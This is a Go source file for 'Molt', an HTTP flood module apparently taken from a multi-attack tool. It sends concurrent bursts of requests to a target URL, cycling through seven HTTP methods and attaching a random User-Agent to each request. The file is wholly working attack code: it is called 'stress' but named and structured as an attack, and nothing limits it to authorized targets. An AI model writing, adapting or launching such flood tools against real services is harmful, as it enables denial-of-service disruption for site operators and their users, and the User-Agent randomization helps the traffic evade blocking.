package sting

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"sync"
	"sync/atomic"
	"time"

	"vivarium/internal/common"
)

// Molt implements an HTTP stress variant (formerly DROPER).
// Sheds different HTTP methods like an insect molting its exoskeleton.
type Molt struct {
	client *http.Client
}

// NewMolt creates a new Molt attack instance.
func NewMolt() *Molt {
	return &Molt{
		client: common.FastHTTPClient(),
	}
}

// Name returns the attack name.
func (m *Molt) Name() string {
	return "Molt"
}

// Description returns a brief description.
func (m *Molt) Description() string {
	return "Molt - sheds varied HTTP methods like an insect shedding its exoskeleton"
}

// Attack executes the Molt attack.
func (m *Molt) Attack(ctx context.Context, target string, opts AttackOpts) (*Result, error) {
	if opts.Concurrency <= 0 {
		opts.Concurrency = 100
	}
	if opts.Rounds <= 0 {
		opts.Rounds = 1000
	}

	var (
		successful atomic.Int64
		failed     atomic.Int64
		completed  atomic.Int64
	)

	start := time.Now()

	// Different "skins" to shed
	methods := []string{"GET", "POST", "HEAD", "OPTIONS", "PUT", "DELETE", "PATCH"}

	jobs := make(chan int, opts.Rounds)
	var wg sync.WaitGroup

	for i := 0; i < opts.Concurrency; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				select {
				case <-ctx.Done():
					return
				case idx, ok := <-jobs:
					if !ok {
						return
					}
					method := methods[idx%len(methods)]
					if m.sendRequest(ctx, target, method) {
						successful.Add(1)
					} else {
						failed.Add(1)
					}
					current := completed.Add(1)

					if opts.Verbose && current%100 == 0 {
						fmt.Printf("\r   Progress: %d/%d requests", current, opts.Rounds)
					}

					if opts.Delay > 0 {
						time.Sleep(opts.Delay)
					}
				}
			}
		}()
	}

	for i := 0; i < opts.Rounds; i++ {
		select {
		case <-ctx.Done():
			break
		case jobs <- i:
		}
	}
	close(jobs)

	wg.Wait()

	if opts.Verbose {
		fmt.Println()
	}

	return &Result{
		TotalRequests: int(completed.Load()),
		Successful:    int(successful.Load()),
		Failed:        int(failed.Load()),
		Duration:      time.Since(start),
	}, nil
}

func (m *Molt) sendRequest(ctx context.Context, target, method string) bool {
	req, err := http.NewRequestWithContext(ctx, method, target, nil)
	if err != nil {
		return false
	}

	req.Header.Set("User-Agent", common.RandomUserAgent())
	req.Header.Set("Accept", "*/*")

	resp, err := m.client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()
	io.Copy(io.Discard, resp.Body)

	return true
}
